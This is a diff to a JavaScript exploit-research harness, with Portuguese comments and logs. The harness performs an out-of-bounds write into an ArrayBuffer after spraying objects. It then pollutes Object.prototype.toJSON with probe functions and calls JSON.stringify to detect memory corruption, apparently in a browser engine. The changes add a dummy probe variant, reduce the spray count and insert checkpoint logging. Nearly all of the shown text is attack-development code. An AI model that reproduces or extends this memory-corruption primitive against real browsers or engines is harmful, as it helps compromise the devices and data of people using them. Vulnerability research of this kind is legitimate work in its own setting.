@@ -20,20 +20,21 @@ class MyComplexObjectForRangeError {
     }
 }
 
-// --- Variantes da toJSON para testar o RangeError ---
+// Mantenha todas as variantes para que o runAllAdvancedTestsS3 possa escolhê-las,
+// mas o runAllAdvancedTestsS3 será modificado para focar em V4.
 export const toJSON_RangeErrorVariants = {
-    V0_EmptyReturn: function() {
+    V0_EmptyReturn: function() { /* ... (como antes) ... */
         return { variant: "V0_EmptyReturn" };
     },
-    V1_AccessThisId: function() {
+    V1_AccessThisId: function() { /* ... (como antes) ... */
         try { return { variant: "V1_AccessThisId", id: String(this.id).substring(0,50) }; }
         catch (e) { return { variant: "V1_AccessThisId", error: `${e.name}: ${e.message}` }; }
     },
-    V2_ToStringCallThis: function() {
+    V2_ToStringCallThis: function() { /* ... (como antes) ... */
         try { return { variant: "V2_ToStringCallThis", type: Object.prototype.toString.call(this) }; }
         catch (e) { return { variant: "V2_ToStringCallThis", error: `${e.name}: ${e.message}` }; }
     },
-    V3_LoopInEmpty_Limited: function() { 
+    V3_LoopInEmpty_Limited: function() { /* ... (como antes) ... */
         let count = 0;
         try {
             for (const p in this) {
@@ -71,7 +72,11 @@ export const toJSON_RangeErrorVariants = {
             return { variant: FNAME_toJSON_Internal, error: `${e.name}: ${e.message}`, props_collected: props, count_at_error: count, last_prop_attempted: last_prop_attempted_log };
         }
     },
-    V5_ObjectKeysThenAccess_Limited: function() { 
+    V4_Dummy: function() { // Uma versão dummy da V4 para teste
+        logS3("   [V4_Dummy toJSON] Chamada.", "info", "V4_Dummy");
+        return { variant: "V4_Dummy", message: "Corpo vazio, apenas para testar a definição."};
+    },
+    V5_ObjectKeysThenAccess_Limited: function() { /* ... (como antes) ... */
         let props = {}; let keys = []; let count = 0;
         const FNAME_toJSON_Internal = "V5_ObjectKeysThenAccess_Limited";
         let last_prop_attempted_log = "N/A_LoopStart_ObjectKeys";
@@ -106,7 +111,7 @@ export async function executeProbeComplexObjectWithMinimalToJSONs(
     const FNAME_TEST = `executeProbeComplexObj<${toJSONFunctionName}>`;
     logS3(`--- Iniciando Teste de Sondagem: Usando ${toJSONFunctionName} ---`, "test", FNAME_TEST);
 
-    const spray_count = 50;
+    const spray_count = 10; // Reduzido
     const sprayed_objects = [];
 
     const corruption_offset_in_oob_ab = 0x70;
@@ -130,14 +135,15 @@ export async function executeProbeComplexObjectWithMinimalToJSONs(
     try {
         logS3(`  Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
         oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
-        logS3("  Escrita OOB feita.", "info", FNAME_TEST); // Log de confirmação da escrita
+        logS3("  Escrita OOB feita. (PONTO DE VERIFICAÇÃO 1)", "info", FNAME_TEST);
     } catch (e_write) {
         logS3(`  ERRO na escrita OOB para ${toJSONFunctionName}: ${e_write.message}`, "error", FNAME_TEST);
         clearOOBEnvironment();
         return { error: e_write, toJSON_name: toJSONFunctionName, stringifyResult: null };
     }
     
-    // await PAUSE_S3(100); // <<<<<<< PAUSA REMOVIDA PARA ESTE TESTE >>>>>>>
+    // PAUSA REMOVIDA CONFORME TESTE ANTERIOR
+    // await PAUSE_S3(100); 
 
     const ppKey_val = 'toJSON';
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
@@ -145,30 +151,33 @@ export async function executeProbeComplexObjectWithMinimalToJSONs(
     let resultFromProbe = { toJSON_name: toJSONFunctionName, error: null, stringifyResult: null, object_id: null };
 
     try {
+        logS3(`  PREPARANDO PARA POLUIR Object.prototype.${ppKey_val} com ${toJSONFunctionName}... (PONTO DE VERIFICAÇÃO 2)`, "info", FNAME_TEST);
         Object.defineProperty(Object.prototype, ppKey_val, {
             value: toJSONFunctionToUse,
             writable: true, configurable: true, enumerable: false
         });
         pollutionApplied = true;
+        logS3(`  Poluição de Object.prototype.${ppKey_val} com ${toJSONFunctionName} FEITA. (PONTO DE VERIFICAÇÃO 3)`, "info", FNAME_TEST);
 
         const target_obj_to_stringify = sprayed_objects[0];
         if (target_obj_to_stringify) {
             resultFromProbe.object_id = target_obj_to_stringify.id;
-            logS3(`  Chamando JSON.stringify(sprayed_objects[0]) (ID: ${target_obj_to_stringify.id}) com ${toJSONFunctionName}...`, "info", FNAME_TEST);
+            logS3(`  Chamando JSON.stringify(sprayed_objects[0]) (ID: ${target_obj_to_stringify.id}) com ${toJSONFunctionName}... (PONTO DE VERIFICAÇÃO 4)`, "info", FNAME_TEST);
             resultFromProbe.stringifyResult = JSON.stringify(target_obj_to_stringify);
-            logS3(`    JSON.stringify completou. Resultado da toJSON: ${JSON.stringify(resultFromProbe.stringifyResult)}`, "info", FNAME_TEST);
+            logS3(`    JSON.stringify completou. Resultado da toJSON: ${JSON.stringify(resultFromProbe.stringifyResult)} (PONTO DE VERIFICAÇÃO 5)`, "info", FNAME_TEST);
             if (resultFromProbe.stringifyResult && resultFromProbe.stringifyResult.error) {
                 resultFromProbe.error = new Error(`Erro interno da toJSON: ${resultFromProbe.stringifyResult.error}`);
             }
         }
     } catch (e_str) {
         resultFromProbe.error = e_str;
-        logS3(`    !!!! ERRO AO STRINGIFY obj[0] com ${toJSONFunctionName} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
+        logS3(`    !!!! ERRO AO STRINGIFY obj[0] com ${toJSONFunctionName} !!!!: ${e_str.name} - ${e_str.message} (PONTO DE VERIFICAÇÃO 6)`, "critical", FNAME_TEST);
     } finally {
         if (pollutionApplied) {
             if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
             else delete Object.prototype.toJSON;
         }
+        logS3(`  Limpeza de poluição para ${toJSONFunctionName} concluída. (PONTO DE VERIFICAÇÃO 7)`, "info", FNAME_TEST);
     }
 
     if (resultFromProbe.error) {
